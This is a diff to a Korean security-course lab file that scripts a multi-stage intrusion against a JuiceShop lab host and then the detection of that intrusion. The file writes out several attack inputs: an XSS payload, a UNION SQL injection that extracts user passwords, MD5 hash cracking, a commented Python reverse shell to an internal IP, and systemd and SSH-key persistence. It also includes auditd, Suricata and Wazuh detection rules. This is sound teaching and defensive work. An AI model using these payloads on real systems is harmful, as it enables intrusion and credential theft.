@@ -1,9 +1,9 @@
 lab_id: battle-adv-ai-week02
-title: 다단계 침투 — Initial Access → Execution → Persistence
+title: 다단계 침투 — Initial Access → Execution → Persistence (AI 지원)
 version: ai
 course: battle-adv-ai
 week: 2
-description: MITRE ATT&CK의 Initial Access, Execution, Persistence 전술을 연계하여 다단계 침투 시나리오를 실습한다. 각 단계의 기법을 이해하고 탐지 및 방어 방법을 학습한다.
+description: MITRE ATT&CK의 Initial Access, Execution, Persistence 전술을 연계하여 다단계 침투 시나리오를 실습한다. 각 단계의 기법을 이해하고 탐지 및 방어 방법을 학습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: hard
 duration_minutes: 150
 objectives:
@@ -23,9 +23,8 @@ steps:
   verify:
     type: output_contains
     expect: open
-  script: 'result = await agent.run("nmap -sV --top-ports 1000 -oN /tmp/multi_stage_recon.txt 10.20.30.80...")
-
-    await agent.analyze(result, "정찰 결과를 분석하고 공격 표면을 매핑하라")'
+  script: nmap -sV --top-ports 1000 -oN /tmp/multi_stage_recon.txt 10.20.30.80
+  risk_level: low
 - order: 2
   instruction: 웹 서버의 디렉토리 구조를 열거하라. gobuster 또는 dirb를 사용하여 숨겨진 엔드포인트를 발견하라.
   hint: dirb를 사용하고 common.txt 워드리스트를 지정한다.
@@ -36,9 +35,8 @@ steps:
   verify:
     type: output_contains
     expect: FOUND
-  script: 'result = await agent.run("dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt -o /tmp/dirb_result.txt 2>&1 | tail -20...")
-
-    await agent.analyze(result, "정찰 결과를 분석하고 공격 표면을 매핑하라")'
+  script: dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt -o /tmp/dirb_result.txt 2>&1 | tail -20
+  risk_level: low
 - order: 3
   instruction: 발견된 웹 서비스에 대해 XSS(Cross-Site Scripting) 취약점을 테스트하라. JuiceShop의 검색 기능에 Reflected XSS 페이로드를 삽입하라.
   hint: 검색 쿼리 파라미터에 <script>alert(1)</script> 페이로드를 포함한다.
@@ -49,11 +47,8 @@ steps:
   verify:
     type: output_contains
     expect: '0'
-  script: 'plan = await agent.plan("공격 기법: 발견된 웹 서비스에 대해 XSS(Cross-Site Scripting) 취약점을 테스트하라. JuiceShop의 검색 기능에 Reflected ")
-
-    result = await agent.execute(plan)
-
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+  script: curl -s 'http://10.20.30.80/#/search?q=<iframe%20src%3D"javascript:alert(1)">' -o /tmp/xss_test.html && grep -c 'script\|iframe\|alert' /tmp/xss_test.html
+  risk_level: medium
 - order: 4
   instruction: SQL Injection을 통해 데이터베이스에서 사용자 목록을 추출하라. JuiceShop의 REST API에 UNION 기반 SQLi를 수행하라.
   hint: products/search 엔드포인트에 UNION SELECT를 사용하여 Users 테이블 데이터를 추출한다.
@@ -64,11 +59,8 @@ steps:
   verify:
     type: output_contains
     expect: email
-  script: 'plan = await agent.plan("공격 기법: SQL Injection을 통해 데이터베이스에서 사용자 목록을 추출하라. JuiceShop의 REST API에 UNION 기반 SQLi를 수행하")
-
-    result = await agent.execute(plan)
-
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+  script: curl -s "http://10.20.30.80/rest/products/search?q=test'))UNION%20SELECT%20id,email,password,role,'5','6','7','8','9'%20FROM%20Users--" | python3 -m json.tool | head -30
+  risk_level: medium
 - order: 5
   instruction: 추출한 비밀번호 해시를 크래킹하라. John the Ripper 또는 hashcat을 사용하여 MD5 해시를 복호화하라.
   hint: 해시를 파일에 저장한 후 john --format=raw-md5 --wordlist 옵션을 사용한다.
@@ -79,11 +71,8 @@ steps:
   verify:
     type: output_contains
     expect: john
-  script: 'plan = await agent.plan("공격 기법: 추출한 비밀번호 해시를 크래킹하라. John the Ripper 또는 hashcat을 사용하여 MD5 해시를 복호화하라.")
-
-    result = await agent.execute(plan)
-
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+  script: echo '0192023a7bbd73250516f069df18b500' > /tmp/hashes.txt && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt 2>&1 | head -10
+  risk_level: medium
 - order: 6
   instruction: Execution 기법을 실습하라. Python을 이용한 리버스 쉘을 시뮬레이션하되, 실제 연결 대신 명령어 구조만 확인하라. 리버스 쉘 코드를 생성하여 파일로 저장하라.
   hint: Python socket 모듈을 이용한 리버스 쉘 코드를 작성한다.
@@ -113,11 +102,26 @@ steps:
   verify:
     type: output_contains
     expect: simulation
-  script: 'plan = await agent.plan("공격 기법: Execution 기법을 실습하라. Python을 이용한 리버스 쉘을 시뮬레이션하되, 실제 연결 대신 명령어 구조만 확인하라. 리버스 쉘 코드를")
+  script: 'cat > /tmp/reverse_shell_sim.py << ''PYEOF''
 
-    result = await agent.execute(plan)
+    import socket,subprocess,os
 
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+    # SIMULATION ONLY - DO NOT EXECUTE
+
+    # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+    # s.connect(("10.20.30.201",4444))
+
+    # os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+
+    # subprocess.call(["/bin/sh","-i"])
+
+    print("Reverse shell simulation - code structure verified")
+
+    PYEOF
+
+    python3 /tmp/reverse_shell_sim.py'
+  risk_level: medium
 - order: 7
   instruction: 'Persistence 기법 1: 신규 사용자 계정을 생성하여 백도어 계정으로 활용하는 시나리오를 시뮬레이션하라. /etc/passwd 형식의 엔트리를 생성하라. (실제 계정 생성 금지)'
   hint: useradd 명령의 결과를 시뮬레이션하여 파일에 기록한다.
@@ -129,11 +133,8 @@ steps:
   verify:
     type: output_contains
     expect: svc_update
-  script: 'plan = await agent.plan("공격 기법: Persistence 기법 1: 신규 사용자 계정을 생성하여 백도어 계정으로 활용하는 시나리오를 시뮬레이션하라. /etc/passwd 형식의 엔")
-
-    result = await agent.execute(plan)
-
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+  script: echo 'svc_update:x:1099:1099:Service Update:/home/svc_update:/bin/bash' > /tmp/persistence_account_sim.txt && echo 'Simulated backdoor account entry:' && cat /tmp/persistence_account_sim.txt
+  risk_level: medium
 - order: 8
   instruction: 'Persistence 기법 2: systemd 서비스를 이용한 지속성 확보를 시뮬레이션하라. 악성 서비스 유닛 파일을 /tmp에 작성하라. (실제 설치 금지)'
   hint: systemd service 유닛 파일 형식으로 작성하되, ExecStart에 리버스 쉘을 설정한다.
@@ -170,11 +171,34 @@ steps:
   verify:
     type: output_contains
     expect: multi-user.target
-  script: 'plan = await agent.plan("공격 기법: Persistence 기법 2: systemd 서비스를 이용한 지속성 확보를 시뮬레이션하라. 악성 서비스 유닛 파일을 /tmp에 작성하라. (실")
+  script: 'cat > /tmp/persistence_service_sim.service << ''EOF''
 
-    result = await agent.execute(plan)
+    [Unit]
 
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+    Description=System Health Monitor
+
+    After=network.target
+
+
+    [Service]
+
+    Type=simple
+
+    ExecStart=/bin/bash -c ''echo PERSISTENCE_SERVICE_ACTIVE > /tmp/svc_beacon.txt''
+
+    Restart=always
+
+    RestartSec=60
+
+
+    [Install]
+
+    WantedBy=multi-user.target
+
+    EOF
+
+    cat /tmp/persistence_service_sim.service'
+  risk_level: medium
 - order: 9
   instruction: 'Persistence 기법 3: SSH authorized_keys를 이용한 지속적 접근을 시뮬레이션하라. 공격자의 SSH 공개키를 삽입하는 시나리오를 테스트하라.'
   hint: ssh-keygen으로 키 쌍을 생성하고 authorized_keys 파일에 추가하는 시나리오를 시뮬레이션한다.
@@ -185,11 +209,8 @@ steps:
   verify:
     type: output_contains
     expect: ed25519
-  script: 'plan = await agent.plan("공격 기법: Persistence 기법 3: SSH authorized_keys를 이용한 지속적 접근을 시뮬레이션하라. 공격자의 SSH 공개키를 삽입하는 시")
-
-    result = await agent.execute(plan)
-
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+  script: ssh-keygen -t ed25519 -f /tmp/apt_key_sim -N '' -q && echo 'Simulated attacker public key:' && cat /tmp/apt_key_sim.pub && echo 'Would be appended to ~/.ssh/authorized_keys'
+  risk_level: medium
 - order: 10
   instruction: 다단계 침투 과정에서 생성된 아티팩트를 탐지하라. auditd 규칙을 작성하여 /etc/passwd 수정, SSH 키 변경, crontab 수정을 모니터링하라.
   hint: auditctl -w 명령으로 파일 감시 규칙을 추가한다.
@@ -216,11 +237,24 @@ steps:
   verify:
     type: output_contains
     expect: persistence
-  script: 'alerts = await agent.monitor("보안 이벤트 수집 및 분석")
+  script: 'cat > /tmp/audit_persistence_rules.conf << ''EOF''
 
-    response = await agent.respond(alerts, "탐지된 위협에 대한 최적 대응 조치를 실행하라")
+    -w /etc/passwd -p wa -k persistence_account
 
-    await agent.log(response, "방어 조치 기록")'
+    -w /etc/shadow -p wa -k persistence_account
+
+    -w /etc/crontab -p wa -k persistence_cron
+
+    -w /var/spool/cron/ -p wa -k persistence_cron
+
+    -w /etc/systemd/system/ -p wa -k persistence_service
+
+    -w /root/.ssh/authorized_keys -p wa -k persistence_ssh
+
+    EOF
+
+    cat /tmp/audit_persistence_rules.conf'
+  risk_level: low
 - order: 11
   instruction: 네트워크 레벨에서 침투 행위를 탐지하기 위한 Suricata 커스텀 규칙을 작성하라. SQL Injection과 리버스 쉘 연결 시도를 탐지하라.
   hint: alert http/tcp 규칙으로 SQL 키워드와 비정상 포트 연결을 탐지한다.
@@ -241,11 +275,18 @@ steps:
   verify:
     type: output_contains
     expect: UNION SELECT
-  script: 'alerts = await agent.monitor("보안 이벤트 수집 및 분석")
+  script: 'cat > /tmp/custom_detection.rules << ''EOF''
 
-    response = await agent.respond(alerts, "탐지된 위협에 대한 최적 대응 조치를 실행하라")
+    alert http any any -> 10.20.30.0/24 any (msg:"SQLI Attempt - UNION SELECT"; flow:to_server,established; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; within:20; sid:1000001; rev:1;)
 
-    await agent.log(response, "방어 조치 기록")'
+    alert tcp 10.20.30.0/24 any -> any 4444 (msg:"Possible Reverse Shell - Port 4444"; flow:established; sid:1000002; rev:1;)
+
+    alert tcp 10.20.30.0/24 any -> any any (msg:"Suspicious Python Reverse Shell"; content:"|2f 62 69 6e 2f 73 68|"; sid:1000003; rev:1;)
+
+    EOF
+
+    cat /tmp/custom_detection.rules'
+  risk_level: low
 - order: 12
   instruction: Wazuh SIEM에서 다단계 침투를 탐지하기 위한 커스텀 규칙을 작성하라. 5분 내 3개 이상의 Persistence 기법이 감지되면 알림을 발생시키는 상관 분석 규칙을 만들어라.
   hint: Wazuh의 composite rule 문법으로 frequency와 timeframe을 설정한다.
@@ -260,11 +301,12 @@ steps:
   verify:
     type: output_contains
     expect: multistage_attack
-  script: 'alerts = await agent.monitor("보안 이벤트 수집 및 분석")
-
-    response = await agent.respond(alerts, "탐지된 위협에 대한 최적 대응 조치를 실행하라")
-
-    await agent.log(response, "방어 조치 기록")'
+  script: "cat > /tmp/wazuh_multistage_rule.xml << 'EOF'\n<group name=\"multistage_attack\">\n  <rule id=\"100100\" level=\"12\" frequency=\"3\" timeframe=\"300\">\n    <if_matched_group>persistence_detection</if_matched_group>\n\
+    \    <description>Multi-stage attack detected: 3+ persistence techniques in 5 minutes</description>\n    <mitre>\n      <id>T1053</id>\n      <id>T1136</id>\n      <id>T1543</id>\n    </mitre>\n  </rule>\n\
+    \  <rule id=\"100101\" level=\"10\">\n    <if_sid>550</if_sid>\n    <match>useradd|adduser</match>\n    <group>persistence_detection</group>\n    <description>Persistence: New user account created</description>\n\
+    \  </rule>\n  <rule id=\"100102\" level=\"10\">\n    <if_sid>552</if_sid>\n    <match>crontab</match>\n    <group>persistence_detection</group>\n    <description>Persistence: Crontab modified</description>\n\
+    \  </rule>\n</group>\nEOF\ncat /tmp/wazuh_multistage_rule.xml"
+  risk_level: low
 - order: 13
   instruction: 침투 과정의 타임라인을 재구성하라. 시스템 로그, 네트워크 로그, 파일 시스템 변경 사항을 시간순으로 정리하라.
   hint: 다양한 로그 소스의 타임스탬프를 통합하여 시간순 정렬한다.
@@ -301,11 +343,34 @@ steps:
   verify:
     type: output_contains
     expect: Timeline
-  script: 'data = await agent.collect("분석 데이터 수집")
+  script: 'cat > /tmp/attack_timeline.txt << ''EOF''
 
-    analysis = await agent.analyze(data, "침투 과정의 타임라인을 재구성하라. 시스템 로그, 네트워크 로그, 파일 시스템 변경 사항을 시간순으로 정리하라.")
+    === Multi-Stage Attack Timeline ===
 
-    await agent.report(analysis, "분석 보고서 생성")'
+    [T+00:00] Reconnaissance: Port scan from 10.20.30.201 → 10.20.30.80 (T1046)
+
+    [T+00:05] Reconnaissance: Directory enumeration via dirb (T1595.003)
+
+    [T+00:10] Initial Access: XSS test on search function (T1189)
+
+    [T+00:15] Initial Access: SQL Injection on REST API (T1190)
+
+    [T+00:20] Credential Access: Password hash extraction (T1003)
+
+    [T+00:25] Credential Access: Hash cracking with john (T1110.002)
+
+    [T+00:30] Execution: Reverse shell code prepared (T1059.006)
+
+    [T+00:35] Persistence: Backdoor account simulated (T1136.001)
+
+    [T+00:40] Persistence: Systemd service created (T1543.002)
+
+    [T+00:45] Persistence: SSH key injection simulated (T1098.004)
+
+    EOF
+
+    cat /tmp/attack_timeline.txt'
+  risk_level: low
 - order: 14
   instruction: 다단계 침투에 대한 방어 체계를 설계하라. 킬체인 각 단계별 탐지-차단-대응 매트릭스를 작성하라.
   hint: Initial Access, Execution, Persistence 각각에 대해 Prevention/Detection/Response를 정의한다.
@@ -344,11 +409,36 @@ steps:
   verify:
     type: output_contains
     expect: Defense Matrix
-  script: 'alerts = await agent.monitor("보안 이벤트 수집 및 분석")
+  script: 'cat > /tmp/defense_matrix.txt << ''EOF''
 
-    response = await agent.respond(alerts, "탐지된 위협에 대한 최적 대응 조치를 실행하라")
+    === Defense Matrix: Multi-Stage Intrusion ===
 
-    await agent.log(response, "방어 조치 기록")'
+
+    | Stage | Prevention | Detection | Response |
+
+    |-------|-----------|-----------|----------|
+
+    | Initial Access | WAF, 패치관리, MFA | IDS/IPS, 웹로그 분석 | IP 차단, 세션 무효화 |
+
+    | Execution | AppArmor, SELinux | EDR, 프로세스 모니터링 | 프로세스 종료, 격리 |
+
+    | Persistence | FIM, 계정정책 | auditd, SIEM 상관분석 | 아티팩트 제거, 계정 비활성화 |
+
+
+    Key Controls:
+
+    1. Network Segmentation (10.20.30.0/24 내부 세그먼트 분리)
+
+    2. Least Privilege (서비스 계정 최소 권한)
+
+    3. Continuous Monitoring (24/7 SOC 운영)
+
+    4. Incident Response Plan (IR 플레이북 정비)
+
+    EOF
+
+    cat /tmp/defense_matrix.txt'
+  risk_level: low
 - order: 15
   instruction: 다단계 침투 실습의 종합 보고서를 작성하라. 공격 경로, 사용된 기법, 탐지 현황, 개선 권고사항을 포함하는 침투 테스트 보고서를 작성하라.
   hint: PTES(Penetration Testing Execution Standard) 형식으로 작성한다.
@@ -363,8 +453,9 @@ steps:
   verify:
     type: output_contains
     expect: Penetration Test Report
-  script: 'data = await agent.collect("분석 데이터 수집")
-
-    analysis = await agent.analyze(data, "다단계 침투 실습의 종합 보고서를 작성하라. 공격 경로, 사용된 기법, 탐지 현황, 개선 권고사항을 포함하는 침투 테스트 보고서를 작성하라.")
-
-    await agent.report(analysis, "분석 보고서 생성")'
+  script: "cat > /tmp/pentest_report_week02.txt << 'EOF'\n=== Penetration Test Report: Multi-Stage Intrusion ===\nDate: 2026-04-03 | Tester: Lab Student | Scope: 10.20.30.0/24\n\n1. Executive Summary\n\
+    \   다단계 침투 테스트 결과, 3개의 Critical, 2개의 High 취약점 발견.\n\n2. Attack Path\n   Port Scan → Directory Enum → SQLi → Hash Extraction → Credential Crack → Persistence\n\n3. Findings\n   [C-01] SQL Injection (CVSS\
+    \ 9.8) - REST API 파라미터 검증 미흡\n   [C-02] Weak Password Hash (CVSS 7.5) - MD5 해시 사용\n   [C-03] Missing FIM (CVSS 7.2) - 주요 설정 파일 무결성 감시 미적용\n   [H-01] Directory Listing (CVSS 5.3) - 디렉토리 인덱싱 활성화\n   [H-02]\
+    \ Missing Rate Limiting (CVSS 5.3) - API 요청 제한 미적용\n\n4. Recommendations\n   - 파라미터화 쿼리 적용 (SQLi 방어)\n   - bcrypt/argon2 해시 전환\n   - auditd + Wazuh FIM 설정\n   - API Rate Limiting 적용\n   - Network Segmentation\
+    \ 강화\n\n5. MITRE ATT&CK Coverage: T1046, T1190, T1003, T1110, T1136, T1543, T1098\nEOF\nwc -l /tmp/pentest_report_week02.txt"
+  risk_level: low
